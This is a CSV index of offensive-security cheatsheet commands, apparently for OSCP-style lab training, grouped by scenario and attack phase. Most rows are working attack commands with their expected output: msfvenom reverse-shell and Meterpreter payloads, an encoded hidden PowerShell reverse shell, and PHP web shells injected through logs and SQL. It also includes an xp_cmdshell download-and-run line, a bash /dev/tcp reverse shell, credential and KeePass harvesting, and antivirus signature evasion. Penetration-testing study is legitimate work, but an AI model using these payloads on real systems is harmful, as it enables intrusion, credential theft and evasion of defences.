"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"metasploit-payloads","msfvenom-badchars","scenario","Scenario 4: Payload Encoding and Bad Character Avoidance","","",""
"metasploit-payloads","msfvenom-list-encoders","scenario","Scenario 4: Payload Encoding and Bad Character Avoidance","","",""
"metasploit-payloads","msfvenom-windows-reverse","section","","Phase 1: Payload Selection (Match Target Platform)","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe","No encoder specified, outputting raw payload"
"metasploit-payloads","msfvenom-linux-reverse","section","","Phase 1: Payload Selection (Match Target Platform)","msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf","Payload size displayed"
"metasploit-payloads","msfvenom-php-shell","section","","Phase 1: Payload Selection (Match Target Platform)","","See command documentation"
"metasploit-payloads","msfvenom-aspx-shell","section","","Phase 1: Payload Selection (Match Target Platform)","","See command documentation"
"metasploit-payloads","msfvenom-encode-shikata","section","","Phase 2: Format and Encoding Configuration","","See command documentation"
"metasploit-payloads","msfvenom-badchars","section","","Phase 2: Format and Encoding Configuration","","See command documentation"
"metasploit-payloads","msfvenom-list-formats","section","","Phase 2: Format and Encoding Configuration","","See command documentation"
"metasploit-payloads","msf-handler-setup","section","","Phase 3: Handler Setup (If Using Meterpreter)","use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run","Started reverse TCP handler on <LHOST>:<LPORT>"
"metasploit-payloads","msf-handler-background","section","","Phase 3: Handler Setup (If Using Meterpreter)","use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j","Exploit running as background job <ID>"
"metasploit-payloads","msfvenom-windows-reverse","section","","Phase 4: Delivery and Execution","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe","No encoder specified, outputting raw payload"
"metasploit-payloads","msfvenom-linux-reverse","section","","Phase 4: Delivery and Execution","msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf","Payload size displayed"
"metasploit-payloads","msfvenom-php-shell","section","","Phase 4: Delivery and Execution","","See command documentation"
"metasploit-payloads","msfvenom-windows-reverse","section","","Phase 5: Verification and Troubleshooting","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe","No encoder specified, outputting raw payload"
"metasploit-payloads","msf-handler-setup","section","","Phase 5: Verification and Troubleshooting","use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run","Started reverse TCP handler on <LHOST>:<LPORT>"
"powershell-one-liners","ps-winrm-credential-setup","scenario","Scenario 1: WinRM Lateral Movement with Flag Retrieval","","",""
"powershell-one-liners","ps-winrm-invoke-command","scenario","Scenario 1: WinRM Lateral Movement with Flag Retrieval","","",""
"powershell-one-liners","ps-search-desktop-flags","scenario","Scenario 1: WinRM Lateral Movement with Flag Retrieval","","",""
"powershell-one-liners","ps-reverse-shell-encoder-python","scenario","Scenario 2: WMI Lateral Movement with Reverse Shell","","",""
"powershell-one-liners","ps-wmi-cimsession-setup","scenario","Scenario 2: WMI Lateral Movement with Reverse Shell","","",""
"powershell-one-liners","ps-wmi-invoke-method","scenario","Scenario 2: WMI Lateral Movement with Reverse Shell","","",""
"powershell-one-liners","ps-reverse-shell-base64","scenario","Scenario 2: WMI Lateral Movement with Reverse Shell","","",""
"powershell-one-liners","ps-get-current-domain","scenario","Scenario 3: Active Directory Enumeration Without Tools","","",""
"powershell-one-liners","ps-ldap-directorysearcher","scenario","Scenario 3: Active Directory Enumeration Without Tools","","",""
"powershell-one-liners","ps-registry-autologon","scenario","Scenario 4: Post-Exploitation Credential Harvesting","","",""
"powershell-one-liners","ps-search-credentials","scenario","Scenario 4: Post-Exploitation Credential Harvesting","","",""
"powershell-one-liners","ps-winrm-credential-setup","section","","Phase 1: Credential Setup for Remote Authentication","$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString","Command executes successfully"
"powershell-one-liners","ps-winrm-invoke-command","section","","Phase 2: Lateral Movement via WinRM","Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {whoami; hostname}","Command executes successfully"
"powershell-one-liners","ps-wmi-cimsession-setup","section","","Phase 3: Lateral Movement via WMI (WinRM Alternative)","$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options","Command executes successfully"
"powershell-one-liners","ps-wmi-invoke-method","section","","Phase 3: Lateral Movement via WMI (WinRM Alternative)","Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}","Command executes successfully"
"powershell-one-liners","ps-reverse-shell-encoder-python","section","","Phase 4: Reverse Shell Payloads","python3 encode.py","Command executes successfully"
"powershell-one-liners","ps-reverse-shell-base64","section","","Phase 4: Reverse Shell Payloads","powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...","Command executes successfully"
"powershell-one-liners","ps-get-current-domain","section","","Phase 5: Active Directory Enumeration (No Tools)","","Domain name, forest, DCs, PDC emulator"
"powershell-one-liners","ps-ldap-directorysearcher","section","","Phase 5: Active Directory Enumeration (No Tools)","","LDAP user objects with properties"
"powershell-one-liners","ps-search-desktop-flags","section","","Phase 6: Flag Retrieval (Quick OSCP Wins)","Get-Content C:\Users\Administrator\Desktop\*.txt","proof.txt contents or flag hash"
"powershell-one-liners","windows-flag-finder-cmd","section","","Phase 6: Flag Retrieval (Quick OSCP Wins)","","C:\Users\Administrator\Desktop\proof.txt"
"powershell-one-liners","windows-flag-finder-ps-simple","section","","Phase 6: Flag Retrieval (Quick OSCP Wins)","","Flag file paths (filesystem only)"
"powershell-one-liners","windows-flag-finder-ps","section","","Phase 6: Flag Retrieval (Quick OSCP Wins)","","[FILE] path [REG] value [ENV] var (comprehensive)"
"powershell-one-liners","ps-registry-autologon","section","","Phase 7: Credential Harvesting","","DefaultUserName, DefaultPassword, DefaultDomainName"
"powershell-one-liners","ps-search-credentials","section","","Phase 7: Credential Harvesting","Get-ChildItem -Path C:\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password","Lines containing 'password' in config files"
"powershell-one-liners","ps-enum-processes","section","","Phase 8: Process & Application Enumeration","","ProcessName, Id, Path table"
"powershell-one-liners","ps-enum-processes-nonstandard","section","","Phase 8: Process & Application Enumeration","","Non-Windows processes (third-party software)"
"powershell-one-liners","ps-enum-installed-apps","section","","Phase 8: Process & Application Enumeration","","DisplayName, DisplayVersion, Publisher table"
"powershell-one-liners","ps-enum-processes-wmi","section","","Phase 8: Process & Application Enumeration","","Processes with CommandLine args (may contain creds)"
"powershell-one-liners","ps-search-keepass-db","section","","Phase 9: Sensitive File Discovery","Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","*.kdbx files (crack with keepass2john)"
"powershell-one-liners","ps-search-password-files","section","","Phase 9: Sensitive File Discovery","Get-ChildItem -Path C:\ -Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup* -File -Recurse -ErrorAction SilentlyContinue","Files named *password*, *cred*, *secret*, etc."
"powershell-one-liners","ps-search-config-files","section","","Phase 9: Sensitive File Discovery","Get-ChildItem -Path C:\ -Include *.ini,*.config,*.xml,*.conf,web.config,*.json -File -Recurse -ErrorAction SilentlyContinue","*.ini, *.config, *.xml, web.config, etc."
"powershell-one-liners","ps-search-app-config","section","","Phase 9: Sensitive File Discovery","Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.conf,*.config,*.xml,*.json -File -Recurse -ErrorAction SilentlyContinue","App config files (replace path with target app directory)"
"powershell-one-liners","ps-search-user-documents","section","","Phase 9: Sensitive File Discovery","Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue","User documents (digital Post-it notes)"
"web-app-enumeration-breadth","curl-header-enum","scenario","Scenario 1: Fresh Web Target - Full Attack Surface Discovery","","",""
"web-app-enumeration-breadth","whatweb-enum","scenario","Scenario 1: Fresh Web Target - Full Attack Surface Discovery","","",""
"web-app-enumeration-breadth","gobuster-dir","scenario","Scenario 1: Fresh Web Target - Full Attack Surface Discovery","","",""
"web-app-enumeration-breadth","ffuf-vhost-fuzz","scenario","Scenario 1: Fresh Web Target - Full Attack Surface Discovery","","",""
"web-app-enumeration-breadth","ffuf-vhost-fuzz","scenario","Scenario 2: Hidden Virtual Hosts - Expanding Attack Surface","","",""
"web-app-enumeration-breadth","gobuster-dir","scenario","Scenario 2: Hidden Virtual Hosts - Expanding Attack Surface","","",""
"web-app-enumeration-breadth","wpscan-enumerate-all","scenario","Scenario 3: CMS Detection and Systematic Enumeration","","",""
"web-app-enumeration-breadth","wpscan-aggressive-detection","scenario","Scenario 3: CMS Detection and Systematic Enumeration","","",""
"web-app-enumeration-breadth","wpscan-password-attack","scenario","Scenario 3: CMS Detection and Systematic Enumeration","","",""
"web-app-enumeration-breadth","gobuster-dir","scenario","Scenario 4: API Discovery and Endpoint Enumeration","","",""
"web-app-enumeration-breadth","ffuf-param-fuzz","scenario","Scenario 4: API Discovery and Endpoint Enumeration","","",""
"web-app-enumeration-breadth","curl-post","scenario","Scenario 4: API Discovery and Endpoint Enumeration","","",""
"web-app-enumeration-breadth","curl-header-enum","section","","Phase 1: Initial Fingerprinting (2-3 minutes)","curl -I -X GET http://192.168.1.100/","Server: Apache/2.4.41, X-Powered-By: PHP/7.4.3"
"web-app-enumeration-breadth","whatweb-enum","section","","Phase 1: Initial Fingerprinting (2-3 minutes)","whatweb -v http://192.168.1.100","Apache, PHP, jQuery, Bootstrap, WordPress 5.8"
"web-app-enumeration-breadth","nikto-scan","section","","Phase 1: Initial Fingerprinting (2-3 minutes)","nikto -h http://192.168.1.100 -o nikto.txt","Server leaks inodes, interesting files found"
"web-app-enumeration-breadth","curl-post","section","","Phase 2: Low-Hanging Fruit Check (1-2 minutes)","curl http://192.168.1.100/robots.txt","Disallow: /admin, /backup, /config"
"web-app-enumeration-breadth","curl-post","section","","Phase 2: Low-Hanging Fruit Check (1-2 minutes)","curl http://192.168.1.100/sitemap.xml","XML sitemap with all pages listed"
"web-app-enumeration-breadth","curl-post","section","","Phase 2: Low-Hanging Fruit Check (1-2 minutes)","curl http://192.168.1.100/.git/HEAD","ref: refs/heads/master (Git exposed!)"
"web-app-enumeration-breadth","curl-post","section","","Phase 2: Low-Hanging Fruit Check (1-2 minutes)","curl http://192.168.1.100/README.md","Application readme with version info"
"web-app-enumeration-breadth","ffuf-vhost-fuzz","section","","Phase 3: Virtual Host Discovery (3-5 minutes)","ffuf -u http://192.168.1.100 -H 'Host: FUZZ.target.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0","dev, admin, api, staging vhosts discovered"
"web-app-enumeration-breadth","gobuster-dir","section","","Phase 3: Virtual Host Discovery (3-5 minutes)","gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain","Found: dev.target.htb, admin.target.htb"
"web-app-enumeration-breadth","gobuster-dir","section","","Phase 4: Directory Enumeration (5-7 minutes)","gobuster dir -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak -t 50","/admin, /uploads, /backup, config.php.bak"
"web-app-enumeration-breadth","ffuf-dir-fuzz","section","","Phase 4: Directory Enumeration (5-7 minutes)","ffuf -u http://192.168.1.100/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html -fc 404","Discovered paths with status codes"
"web-app-enumeration-breadth","gobuster-dir","section","","Phase 4: Directory Enumeration (5-7 minutes)","gobuster dir -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50","Common backup files, logs, configs"
"web-app-enumeration-breadth","wpscan-enumerate-all","section","","Phase 5: CMS-Specific Enumeration (if detected)","wpscan --url http://192.168.1.100 --enumerate u,vp,vt --plugins-detection aggressive","Users, vulnerable plugins, vulnerable themes"
"web-app-enumeration-breadth","droopescan-enumerate","section","","Phase 5: CMS-Specific Enumeration (if detected)","droopescan scan drupal -u http://192.168.1.100","Drupal version, installed modules"
"web-app-enumeration-breadth","nikto-scan","section","","Phase 5: CMS-Specific Enumeration (if detected)","joomscan -u http://192.168.1.100","Joomla version, vulnerable components"
"web-app-enumeration-breadth","wfuzz-params","section","","Phase 6: Parameter Discovery (2-3 minutes)","wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 'http://192.168.1.100/index.php?FUZZ=test'","Hidden parameters: debug, id, user, admin"
"web-app-enumeration-breadth","ffuf-param-fuzz","section","","Phase 6: Parameter Discovery (2-3 minutes)","ffuf -u 'http://192.168.1.100/search.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0","Parameters with different responses"
"web-app-enumeration-breadth","sqli-manual-test","section","","Phase 7: Quick Vulnerability Surface Check (2-3 minutes)","' OR 1=1-- (in login/search fields)","SQL error or behavior change = injectable"
"web-app-enumeration-breadth","lfi-test","section","","Phase 7: Quick Vulnerability Surface Check (2-3 minutes)","../../../../../../etc/passwd (in file parameters)","root:x:0:0:root = LFI confirmed"
"web-app-enumeration-breadth","xss-test","section","","Phase 7: Quick Vulnerability Surface Check (2-3 minutes)","<script>alert(1)</script> (in input fields)","Alert box = XSS, encoded output = filtered"
"web-app-enumeration-breadth","web-manual-enumeration","section","","Phase 8: Attack Surface Summary (1 minute)","Document findings in enumeration.md","Prioritized attack vector list"
"log-poisoning","lfi-access-log-apache","scenario","Scenario 1: Apache access.log Poisoning - Classic LFI to RCE","","",""
"log-poisoning","curl-ua-poison-apache","scenario","Scenario 1: Apache access.log Poisoning - Classic LFI to RCE","","",""
"log-poisoning","lfi-rce-trigger","scenario","Scenario 1: Apache access.log Poisoning - Classic LFI to RCE","","",""
"log-poisoning","curl-ua-poison-nginx","scenario","Scenario 2: Nginx access.log Poisoning - Platform Variation","","",""
"log-poisoning","lfi-access-log-nginx","scenario","Scenario 2: Nginx access.log Poisoning - Platform Variation","","",""
"log-poisoning","lfi-rce-trigger","scenario","Scenario 2: Nginx access.log Poisoning - Platform Variation","","",""
"log-poisoning","ssh-authlog-poison","scenario","Scenario 3: SSH auth.log Poisoning - Alternative Attack Vector","","",""
"log-poisoning","lfi-auth-log","scenario","Scenario 3: SSH auth.log Poisoning - Alternative Attack Vector","","",""
"log-poisoning","lfi-rce-trigger","scenario","Scenario 3: SSH auth.log Poisoning - Alternative Attack Vector","","",""
"log-poisoning","lfi-proc-environ","scenario","Scenario 4: /proc/self/environ Poisoning - Advanced Technique","","",""
"log-poisoning","lfi-rce-trigger","scenario","Scenario 4: /proc/self/environ Poisoning - Advanced Technique","","",""
"log-poisoning","lfi-rce-trigger","scenario","Scenario 5: PHP Session Poisoning - Edge Case Technique","","",""
"log-poisoning","lfi-access-log-apache","section","","Phase 1: Prerequisites & Detection (1-2 minutes)","curl 'http://192.168.45.100:80/index.php?page=../../../../var/log/apache2/access.log'","Shows web vulnerability or response"
"log-poisoning","lfi-access-log-nginx","section","","Phase 1: Prerequisites & Detection (1-2 minutes)","curl 'http://192.168.45.100:80/index.php?file=../../../../var/log/nginx/access.log'","Shows web vulnerability or response"
"log-poisoning","lfi-auth-log","section","","Phase 1: Prerequisites & Detection (1-2 minutes)","curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/auth.log'","Shows web vulnerability or response"
"log-poisoning","lfi-proc-environ","section","","Phase 1: Prerequisites & Detection (1-2 minutes)","curl -A '<?php system($_GET[""c""]); ?>' 'http://192.168.45.100:80/index.php?page=../../../../proc/self/environ'","Shows web vulnerability or response"
"log-poisoning","curl-ua-poison-apache","section","","Phase 2: Log Injection (1-2 minutes per target)","curl -A '<?php system($_GET[""c""]); ?>' http://192.168.45.100:80/","HTTP 200 response (page loads normally)"
"log-poisoning","curl-ua-poison-nginx","section","","Phase 2: Log Injection (1-2 minutes per target)","curl -A '<?php system($_GET[""c""]); ?>' http://192.168.45.100:80/","Shows web vulnerability or response"
"log-poisoning","ssh-authlog-poison","section","","Phase 2: Log Injection (1-2 minutes per target)","ssh '<?php system($_GET[""c""]); ?>'@192.168.45.100","Shows web vulnerability or response"
"log-poisoning","lfi-rce-trigger","section","","Phase 3: RCE Trigger & Shell Upgrade (2-3 minutes)","curl 'http://192.168.45.100:80/page.php?file=../../../../var/log/apache2/access.log&c=whoami'","Shows web vulnerability or response"
"log-poisoning","lfi-proc-environ","section","","Phase 4: Troubleshooting & Alternatives (when standard methods fail)","curl -A '<?php system($_GET[""c""]); ?>' 'http://192.168.45.100:80/index.php?page=../../../../proc/self/environ'","Shows web vulnerability or response"
"log-poisoning","ssh-authlog-poison","section","","Phase 4: Troubleshooting & Alternatives (when standard methods fail)","ssh '<?php system($_GET[""c""]); ?>'@192.168.45.100","Shows web vulnerability or response"
"sql-injection-rce","sqlmap-os-shell-mssql","scenario","Scenario 1: MSSQL xp_cmdshell - Classic Windows Foothold","","",""
"sql-injection-rce","mssql-xpcmdshell-enable","scenario","Scenario 1: MSSQL xp_cmdshell - Classic Windows Foothold","","",""
"sql-injection-rce","mssql-xpcmdshell-whoami","scenario","Scenario 1: MSSQL xp_cmdshell - Classic Windows Foothold","","",""
"sql-injection-rce","mysql-into-outfile-webshell","scenario","Scenario 2: MySQL INTO OUTFILE Webshell - Linux/Windows Web Foothold","","",""
"sql-injection-rce","sqlmap-file-write","scenario","Scenario 2: MySQL INTO OUTFILE Webshell - Linux/Windows Web Foothold","","",""
"sql-injection-rce","sqlmap-os-shell-mysql","scenario","Scenario 2: MySQL INTO OUTFILE Webshell - Linux/Windows Web Foothold","","",""
"sql-injection-rce","postgresql-copy-webshell","scenario","Scenario 3: PostgreSQL COPY TO / Large Object RCE - Advanced Technique","","",""
"sql-injection-rce","postgresql-lo-export","scenario","Scenario 3: PostgreSQL COPY TO / Large Object RCE - Advanced Technique","","",""
"sql-injection-rce","sqlmap-os-shell-postgresql","scenario","Scenario 3: PostgreSQL COPY TO / Large Object RCE - Advanced Technique","","",""
"sql-injection-rce","sqlmap-os-shell","scenario","Scenario 4: sqlmap --os-shell Automated RCE - Fast Exam Technique","","",""
"sql-injection-rce","sqlmap-is-dba","scenario","Scenario 4: sqlmap --os-shell Automated RCE - Fast Exam Technique","","",""
"sql-injection-rce","sqlmap-os-cmd","scenario","Scenario 4: sqlmap --os-shell Automated RCE - Fast Exam Technique","","",""
"sql-injection-rce","sqlmap-fingerprint","section","","Phase 1: SQLi Confirmation and Database Identification (2-5 minutes)","sqlmap -u 'http://192.168.45.100/page.php?id=1' --batch --banner --fingerprint","Database type, version, and banner information"
"sql-injection-rce","sqlmap-is-dba","section","","Phase 1: SQLi Confirmation and Database Identification (2-5 minutes)","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --is-dba --batch","current user is DBA: True/False"
"sql-injection-rce","sqlmap-privileges","section","","Phase 1: SQLi Confirmation and Database Identification (2-5 minutes)","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --privileges --batch","Database user privilege listing"
"sql-injection-rce","sqlmap-os-shell-mssql","section","","Phase 2: MSSQL xp_cmdshell Exploitation (3-5 minutes)","sqlmap -u 'http://192.168.45.100/page.aspx?id=1' -p id --os-shell --dbms=mssql --batch","os-shell> prompt for command execution"
"sql-injection-rce","mssql-xpcmdshell-enable","section","","Phase 2: MSSQL xp_cmdshell Exploitation (3-5 minutes)","'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--","Configuration option changed (no error)"
"sql-injection-rce","mssql-xpcmdshell-reverse-shell","section","","Phase 2: MSSQL xp_cmdshell Exploitation (3-5 minutes)","'; EXEC xp_cmdshell 'powershell -nop -c ""IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')""';--","Reverse shell connection on attacker listener"
"sql-injection-rce","mysql-check-file-priv","section","","Phase 3: MySQL INTO OUTFILE Webshell (3-5 minutes)","' UNION SELECT 1,@@secure_file_priv,3--","Empty string (vulnerable) or path restriction"
"sql-injection-rce","mysql-into-outfile-webshell","section","","Phase 3: MySQL INTO OUTFILE Webshell (3-5 minutes)","' UNION SELECT '<?php system($_GET[""c""]); ?>' INTO OUTFILE '/var/www/html/shell.php'--","Query OK (file created in web root)"
"sql-injection-rce","mysql-hex-webshell","section","","Phase 3: MySQL INTO OUTFILE Webshell (3-5 minutes)","' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e INTO OUTFILE '/var/www/html/s.php'--","Query OK (hex-encoded PHP shell written)"
"sql-injection-rce","postgresql-check-superuser","section","","Phase 4: PostgreSQL COPY/Large Object RCE (3-5 minutes)","'; SELECT current_setting('is_superuser');--","'on' (superuser) or 'off' (limited)"
"sql-injection-rce","postgresql-copy-webshell","section","","Phase 4: PostgreSQL COPY/Large Object RCE (3-5 minutes)","'; COPY (SELECT '<?php system($_GET[""c""]); ?>') TO '/var/www/html/shell.php';--","COPY 1 (file written successfully)"
"sql-injection-rce","postgresql-copy-program","section","","Phase 4: PostgreSQL COPY/Large Object RCE (3-5 minutes)","'; COPY (SELECT '') TO PROGRAM 'bash -c ""bash -i >& /dev/tcp/10.10.14.5/4444 0>&1""';--","Reverse shell connection (PostgreSQL 9.3+)"
"sql-injection-rce","sqlmap-os-shell","section","","Phase 5: sqlmap Automated OS Shell (2-5 minutes)","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-shell --batch","os-shell> prompt for interactive command execution"
"sql-injection-rce","sqlmap-os-cmd","section","","Phase 5: sqlmap Automated OS Shell (2-5 minutes)","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --os-cmd='whoami' --batch","Command output: www-data or nt authority\system"
"sql-injection-rce","sqlmap-file-write","section","","Phase 5: sqlmap Automated OS Shell (2-5 minutes)","sqlmap -u 'http://192.168.45.100/page.php?id=1' -p id --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch","File written successfully message"
"rfi-lfi-evaluation","lfi-test","scenario","Scenario 1: Linux Web Server - /etc/passwd Retrieval via LFI","","",""
"rfi-lfi-evaluation","curl-post","scenario","Scenario 2: Windows IIS - Configuration File Extraction","","",""
"rfi-lfi-evaluation","curl-post","scenario","Scenario 3: PHP Wrappers - RCE via Log Poisoning","","",""
"rfi-lfi-evaluation","lfi-test","section","","Phase 1: Detection & Verification","../../../../../../etc/passwd","root:x:0:0"
"rfi-lfi-evaluation","curl-post","section","","Phase 1: Detection & Verification","curl -X POST -d 'username=admin' http://192.168.1.100/login.php","200 OK"
"rfi-lfi-evaluation","curl-post","section","","Phase 2: Information Gathering","curl -X POST -d 'username=admin' http://192.168.1.100/login.php","200 OK"
"rfi-lfi-evaluation","curl-post","section","","Phase 3: Exploitation (RCE Upgrade)","curl -X POST -d 'username=admin' http://192.168.1.100/login.php","200 OK"
"signature-evasion-workflow","find-av-signature","scenario","Scenario 1: Payload Flagged Immediately (Signature Hunting)","","",""
"signature-evasion-workflow","modify-signature-bytes","scenario","Scenario 1: Payload Flagged Immediately (Signature Hunting)","","",""
"signature-evasion-workflow","clamscan-test","scenario","Scenario 1: Payload Flagged Immediately (Signature Hunting)","","",""
"signature-evasion-workflow","msfvenom-encoder-shikata","scenario","Scenario 2: Shikata Encoding Detected (Template Injection Alternative)","","",""
"signature-evasion-workflow","msfvenom-encoder-zutto","scenario","Scenario 2: Shikata Encoding Detected (Template Injection Alternative)","","",""
"signature-evasion-workflow","msfvenom-template-injection","scenario","Scenario 2: Shikata Encoding Detected (Template Injection Alternative)","","",""
"signature-evasion-workflow","msfvenom-encrypt-aes","scenario","Scenario 2: Shikata Encoding Detected (Template Injection Alternative)","","",""
"signature-evasion-workflow","clamscan-test","scenario","Scenario 2: Shikata Encoding Detected (Template Injection Alternative)","","",""
"signature-evasion-workflow","msfvenom-encoder-shikata","scenario","Scenario 3: Layered Encoding (Shikata + AES Encryption)","","",""
"signature-evasion-workflow","msfvenom-encrypt-aes","scenario","Scenario 3: Layered Encoding (Shikata + AES Encryption)","","",""
"signature-evasion-workflow","msfvenom-template-injection","scenario","Scenario 3: Layered Encoding (Shikata + AES Encryption)","","",""
"signature-evasion-workflow","clamscan-test","scenario","Scenario 3: Layered Encoding (Shikata + AES Encryption)","","",""
"signature-evasion-workflow","clamscan-test","scenario","Scenario 4: Iterative Testing (ClamAV → Defender Progression)","","",""
"signature-evasion-workflow","find-av-signature","scenario","Scenario 4: Iterative Testing (ClamAV → Defender Progression)","","",""
"signature-evasion-workflow","modify-signature-bytes","scenario","Scenario 4: Iterative Testing (ClamAV → Defender Progression)","","",""
"signature-evasion-workflow","find-av-signature","section","","Phase 1: Signature Identification","Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\payload.exe -OutPath C:\Tools\avtest -Verbose -Force","Creates test files in output directory. Scan each with AV..."
"signature-evasion-workflow","clamscan-test","section","","Phase 1: Signature Identification","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe C:\Tools\payload.exe","Clean: 'OK' or '0 infected'
Detected: Signature name and ..."
"signature-evasion-workflow","msfvenom-encoder-shikata","section","","Phase 2: Encoding Techniques","msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe","Encoded executable created. Note: Likely still detected b..."
"signature-evasion-workflow","msfvenom-encoder-zutto","section","","Phase 2: Encoding Techniques","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x64/zutto_dekiru -i 10 -f exe -o payload64.exe","x64 encoded executable. Same limitations as shikata - lik..."
"signature-evasion-workflow","msfvenom-encrypt-aes","section","","Phase 2: Encoding Techniques","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 --encrypt aes256 --encrypt-key MySecretKey2024 -f exe -o payload_aes.exe","AES-encrypted executable. Better evasion than encoding bu..."
"signature-evasion-workflow","modify-signature-bytes","section","","Phase 3: Manual Modification","$bytes = [System.IO.File]::ReadAllBytes('C:\Tools\payload.exe')
$bytes[18867] = 0x00
[System.IO.File]::WriteAllBytes('C:\Tools\payload_modified.exe', $bytes)","Modified executable created. Test with AV scan - should b..."
"signature-evasion-workflow","msfvenom-template-injection","section","","Phase 3: Manual Modification","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -x /usr/share/windows-binaries/nc.exe -f exe -o payload_injected.exe","Executable with embedded payload. Template's original fun..."
"signature-evasion-workflow","clamscan-test","section","","Phase 4: Testing & Validation","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe C:\Tools\payload.exe","Clean: 'OK' or '0 infected'
Detected: Signature name and ..."
"shellcode-runner-evasion","msfvenom-csharp-payload","scenario","Scenario 1: Msfvenom Payload Caught by Defender (Basic Runner)","","",""
